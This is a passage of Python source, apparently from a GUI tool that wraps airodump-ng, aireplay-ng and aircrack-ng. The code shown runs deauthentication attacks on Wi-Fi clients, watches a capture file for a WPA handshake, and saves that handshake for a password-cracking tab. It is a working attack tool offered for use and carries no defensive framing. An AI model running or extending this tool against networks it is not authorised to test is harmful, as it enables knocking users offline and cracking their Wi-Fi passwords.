                    stdout_line = self.app.capture_process.stdout.readline()
                    if stdout_line:
                        self.app.log_message(f"Capture stdout: {stdout_line}", "INFO")
                    stderr_line = self.app.capture_process.stderr.readline()
                    if stderr_line:
                        self.app.log_message(f"Capture stderr: {stderr_line}", "ERROR")
                    if os.path.exists(cap_file):
                        current_size = os.path.getsize(cap_file)
                        if current_size != last_size:
                            self.app.log_message(f"Capture file size: {current_size} bytes", "INFO")
                            last_size = current_size
                        try:
                            # Check with aircrack-ng first
                            output = run_command(f"aircrack-ng {cap_file}")
                            if output and "[ WPA handshake: " in output:
                                self.app.log_message(f"Handshake detected via aircrack-ng: {output}", "SUCCESS")
                                if client_mac != "FF:FF:FF:FF:FF:FF":
                                    self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                                self.stop_capture()
                                self.app.root.after(0, self.show_handshake_modal)
                                return
                            self.app.log_message(f"aircrack-ng check: {output}", "INFO")
                            # Fallback to tcpdump
                            output = run_command(f"tcpdump -r {cap_file} eapol 2>/dev/null")
                            if output:
                                self.app.log_message(f"EAPOL packets detected via tcpdump: {output}", "INFO")
                                # Verify with aircrack-ng
                                output = run_command(f"aircrack-ng {cap_file}")
                                if output and "[ WPA handshake: " in output:
                                    self.app.log_message(f"Handshake confirmed via aircrack-ng: {output}", "SUCCESS")
                                    if client_mac != "FF:FF:FF:FF:FF:FF":
                                        self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                                    self.stop_capture()
                                    self.app.root.after(0, self.show_handshake_modal)
                                    return
                        except Exception as e:
                            self.app.log_message(f"Error checking handshake: {str(e)}", "ERROR")
                    time.sleep(2)
                # Final check after timeout
                if os.path.exists(cap_file):
                    output = run_command(f"aircrack-ng {cap_file}")
                    if output and "[ WPA handshake: " in output:
                        self.app.log_message(f"Handshake detected via aircrack-ng: {output}", "SUCCESS")
                        if client_mac != "FF:FF:FF:FF:FF:FF":
                            self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                        self.stop_capture()
                        self.app.root.after(0, self.show_handshake_modal)
                        return
                self.stop_capture()
                self.app.log_message(f"Capture timed out after 120 seconds. No handshake detected.", "WARNING")
                self.app.root.after(0, messagebox.showwarning, "Warning", "No handshake detected after 120 seconds. Try a different device, broadcast deauth, or a longer capture.")
            except Exception as e:
                self.app.log_message(f"Capture with deauth error: {str(e)}", "ERROR")
                self.stop_capture()
                self.app.root.after(0, messagebox.showerror, "Error", f"Capture failed: {str(e)}")

        threading.Thread(target=combined, daemon=True).start()
        self.app.root.after(0, messagebox.showinfo, "Info", "Capture with deauth started. Wait for handshake detection or 120 seconds. Check log for '[ WPA handshake: <BSSID> ]' or EAPOL packets.")

    def stop_capture(self):
        """Stop handshake capture and deauth if running."""
        monitor = self.app.monitor_interface.get()
        if self.app.capture_process:
            run_command(f"pkill -9 -f 'airodump-ng.*{monitor}'", capture_output=False)
            self.app.capture_process = None
            self.app.log_message("Handshake capture stopped.", "INFO")
        if self.app.deauth_process or self.app.continuous_deauth.get():
            run_command(f"pkill -9 -f 'aireplay-ng.*{monitor}'", capture_output=False)
            self.app.deauth_process = None
            self.app.continuous_deauth.set(False)
            self.app.broadcast_deauth.set(False)
            self.app.log_message("Deauth attack stopped.", "INFO")
        self.app.root.after(0, messagebox.showinfo, "Success", "Capture and deauth (if running) stopped.")
        if os.path.exists("handshake-01.cap"):
            output = run_command(f"aircrack-ng handshake-01.cap")
            if output:
                self.app.log_message(f"Handshake validation: {output}", "INFO")
                if "No valid WPA handshakes found" in output:
                    self.app.root.after(0, messagebox.showwarning, "Warning", "No valid WPA handshake found in handshake-01.cap. Try broadcast deauth, a different device, or a longer capture.")
                elif "[ WPA handshake: " in output:
                    self.app.log_message("Valid WPA handshake found in handshake-01.cap.", "SUCCESS")
                    client_mac = self.app.selected_client.get() if self.app.selected_client.get() else None
                    if client_mac and client_mac != "FF:FF:FF:FF:FF:FF":
                        self.app.root.after(0, lambda: self.update_probes_column(client_mac))
                    self.app.root.after(0, self.show_handshake_modal)

    def save_capture(self):
        """Save captured handshake file and load into Password Cracking tab."""
        if not os.path.exists("handshake-01.cap"):
            self.app.log_message("Error: handshake-01.cap does not exist. Ensure capture was successful.", "ERROR")
            self.app.root.after(0, messagebox.showerror, "Error", "No capture file found. Run 'Start Handshake Capture' or 'Capture + Deauth' first.")
            return
        file_path = filedialog.asksaveasfilename(defaultextension=".cap", filetypes=[("Capture files", "*.cap")])
        if file_path:
            try:
                os.rename("handshake-01.cap", file_path)
                self.app.log_message(f"Capture saved to {file_path}", "SUCCESS")
                self.app.handshake_file.set(file_path)
                self.app.root.after(0, messagebox.showinfo, "Success", f"Capture saved to {file_path} and loaded in the 'Password Cracking' tab. Select a wordlist and click 'Start Cracking'.")
            except Exception as e:
                self.app.log_message(f"Error saving capture: {str(e)}", "ERROR")
                self.app.root.after(0, messagebox.showerror, "Error", f"Error saving capture: {str(e)}")